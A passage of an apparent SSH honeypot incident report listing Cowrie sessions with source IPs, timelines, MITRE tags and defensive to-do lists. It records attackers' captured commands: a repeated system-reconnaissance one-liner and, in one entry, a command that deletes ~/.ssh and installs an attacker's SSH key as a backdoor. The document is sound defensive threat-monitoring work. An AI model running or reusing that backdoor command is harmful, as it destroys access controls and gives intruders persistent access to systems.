| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 00:59:29` | `cowrie.session.connect` |
| `2026-08-15 00:59:30` | `cowrie.client.version` |
| `2026-08-15 00:59:30` | `cowrie.client.kex` |
| `2026-08-15 00:59:31` | `cowrie.login.success` |
| `2026-08-15 00:59:32` | `cowrie.session.params` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.success` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.command.input` |
| `2026-08-15 00:59:32` | `cowrie.log.closed` |
| `2026-08-15 00:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199d0da87b6c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:01 |
| **Last Seen** | 2026-08-15 01:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:01:26` | `cowrie.session.connect` |
| `2026-08-15 01:01:26` | `cowrie.client.version` |
| `2026-08-15 01:01:27` | `cowrie.client.kex` |
| `2026-08-15 01:01:28` | `cowrie.login.success` |
| `2026-08-15 01:01:29` | `cowrie.session.params` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.success` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.command.input` |
| `2026-08-15 01:01:29` | `cowrie.log.closed` |
| `2026-08-15 01:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667fad38a5f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:03 |
| **Last Seen** | 2026-08-15 01:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:03:25` | `cowrie.session.connect` |
| `2026-08-15 01:03:25` | `cowrie.client.version` |
| `2026-08-15 01:03:25` | `cowrie.client.kex` |
| `2026-08-15 01:03:26` | `cowrie.login.success` |
| `2026-08-15 01:03:27` | `cowrie.session.params` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.success` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.command.input` |
| `2026-08-15 01:03:27` | `cowrie.log.closed` |
| `2026-08-15 01:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d93411b9d5

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-08-15 01:03 |
| **Last Seen** | 2026-08-15 01:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:03:30` | `cowrie.session.connect` |
| `2026-08-15 01:03:31` | `cowrie.client.version` |
| `2026-08-15 01:03:31` | `cowrie.client.kex` |
| `2026-08-15 01:03:32` | `cowrie.login.success` |
| `2026-08-15 01:03:32` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5284755f3d2

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-15 01:03 |
| **Last Seen** | 2026-08-15 01:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:03:37` | `cowrie.session.connect` |
| `2026-08-15 01:03:38` | `cowrie.client.version` |
| `2026-08-15 01:03:38` | `cowrie.client.kex` |
| `2026-08-15 01:03:39` | `cowrie.login.success` |
| `2026-08-15 01:03:40` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55a6cd937a86

| Field | Detail |
|---|---|
| **Source IP** | `65.20.191[.]231` |
| **First Seen** | 2026-08-15 01:03 |
| **Last Seen** | 2026-08-15 01:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:03:53` | `cowrie.session.connect` |
| `2026-08-15 01:03:53` | `cowrie.client.version` |
| `2026-08-15 01:03:53` | `cowrie.client.kex` |
| `2026-08-15 01:03:55` | `cowrie.login.success` |
| `2026-08-15 01:03:55` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.191[.]231` to AbuseIPDB if not already reported
- [ ] Block `65.20.191[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9f123bbc0ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:05 |
| **Last Seen** | 2026-08-15 01:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:05:22` | `cowrie.session.connect` |
| `2026-08-15 01:05:22` | `cowrie.client.version` |
| `2026-08-15 01:05:22` | `cowrie.client.kex` |
| `2026-08-15 01:05:23` | `cowrie.login.success` |
| `2026-08-15 01:05:24` | `cowrie.session.params` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.success` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:24` | `cowrie.command.input` |
| `2026-08-15 01:05:25` | `cowrie.log.closed` |
| `2026-08-15 01:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-324290439c3d

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-15 01:06 |
| **Last Seen** | 2026-08-15 01:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:06:06` | `cowrie.session.connect` |
| `2026-08-15 01:06:06` | `cowrie.client.version` |
| `2026-08-15 01:06:06` | `cowrie.client.kex` |
| `2026-08-15 01:06:06` | `cowrie.login.success` |
| `2026-08-15 01:06:07` | `cowrie.session.params` |
| `2026-08-15 01:06:07` | `cowrie.command.input` |
| `2026-08-15 01:06:07` | `cowrie.command.failed` |
| `2026-08-15 01:06:07` | `cowrie.log.closed` |
| `2026-08-15 01:06:08` | `cowrie.session.params` |
| `2026-08-15 01:06:08` | `cowrie.command.input` |
| `2026-08-15 01:06:08` | `cowrie.session.file_download` |
| `2026-08-15 01:06:08` | `cowrie.log.closed` |
| `2026-08-15 01:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e8b7367913

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-15 01:06 |
| **Last Seen** | 2026-08-15 01:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:06:08` | `cowrie.session.connect` |
| `2026-08-15 01:06:08` | `cowrie.client.version` |
| `2026-08-15 01:06:08` | `cowrie.client.kex` |
| `2026-08-15 01:06:08` | `cowrie.login.success` |
| `2026-08-15 01:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d7bc6b5d748

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-15 01:06 |
| **Last Seen** | 2026-08-15 01:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:06:08` | `cowrie.session.connect` |
| `2026-08-15 01:06:08` | `cowrie.client.version` |
| `2026-08-15 01:06:08` | `cowrie.client.kex` |
| `2026-08-15 01:06:09` | `cowrie.login.success` |
| `2026-08-15 01:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720c5cf47913

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:07 |
| **Last Seen** | 2026-08-15 01:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:07:17` | `cowrie.session.connect` |
| `2026-08-15 01:07:17` | `cowrie.client.version` |
| `2026-08-15 01:07:17` | `cowrie.client.kex` |
| `2026-08-15 01:07:18` | `cowrie.login.success` |
| `2026-08-15 01:07:19` | `cowrie.session.params` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.success` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:19` | `cowrie.command.input` |
| `2026-08-15 01:07:20` | `cowrie.log.closed` |
| `2026-08-15 01:07:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a110ff76a88

| Field | Detail |
|---|---|
| **Source IP** | `175.100.107[.]238` |
| **First Seen** | 2026-08-15 01:07 |
| **Last Seen** | 2026-08-15 01:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:07:52` | `cowrie.session.connect` |
| `2026-08-15 01:07:52` | `cowrie.client.version` |
| `2026-08-15 01:07:52` | `cowrie.client.kex` |
| `2026-08-15 01:07:55` | `cowrie.login.success` |
| `2026-08-15 01:07:56` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:08:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.100.107[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.100.107[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40d0739a3bc4

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]244` |
| **First Seen** | 2026-08-15 01:09 |
| **Last Seen** | 2026-08-15 01:14 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:09:01` | `cowrie.session.connect` |
| `2026-08-15 01:09:01` | `cowrie.client.version` |
| `2026-08-15 01:09:01` | `cowrie.client.kex` |
| `2026-08-15 01:09:02` | `cowrie.login.success` |
| `2026-08-15 01:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]244` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a58865b269

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:09 |
| **Last Seen** | 2026-08-15 01:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:09:17` | `cowrie.session.connect` |
| `2026-08-15 01:09:17` | `cowrie.client.version` |
| `2026-08-15 01:09:17` | `cowrie.client.kex` |
| `2026-08-15 01:09:19` | `cowrie.login.success` |
| `2026-08-15 01:09:20` | `cowrie.session.params` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.success` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.command.input` |
| `2026-08-15 01:09:20` | `cowrie.log.closed` |
| `2026-08-15 01:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8006c7ac4f75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:11 |
| **Last Seen** | 2026-08-15 01:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:11:15` | `cowrie.session.connect` |
| `2026-08-15 01:11:15` | `cowrie.client.version` |
| `2026-08-15 01:11:15` | `cowrie.client.kex` |
| `2026-08-15 01:11:17` | `cowrie.login.success` |
| `2026-08-15 01:11:18` | `cowrie.session.params` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.success` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.command.input` |
| `2026-08-15 01:11:18` | `cowrie.log.closed` |
| `2026-08-15 01:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16248ccbe7a3

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-08-15 01:11 |
| **Last Seen** | 2026-08-15 01:11 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:11:30` | `cowrie.session.connect` |
| `2026-08-15 01:11:31` | `cowrie.client.version` |
| `2026-08-15 01:11:31` | `cowrie.client.kex` |
| `2026-08-15 01:11:35` | `cowrie.login.success` |
| `2026-08-15 01:11:36` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b52f12584a8

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-15 01:11 |
| **Last Seen** | 2026-08-15 01:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 01:11:42` | `cowrie.session.connect` |
| `2026-08-15 01:11:42` | `cowrie.client.version` |
| `2026-08-15 01:11:42` | `cowrie.client.kex` |
| `2026-08-15 01:11:44` | `cowrie.login.success` |
| `2026-08-15 01:11:45` | `cowrie.direct-tcpip.request` |
| `2026-08-15 01:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc10e782e5c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-08-15 01:13 |
| **Last Seen** | 2026-08-15 01:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
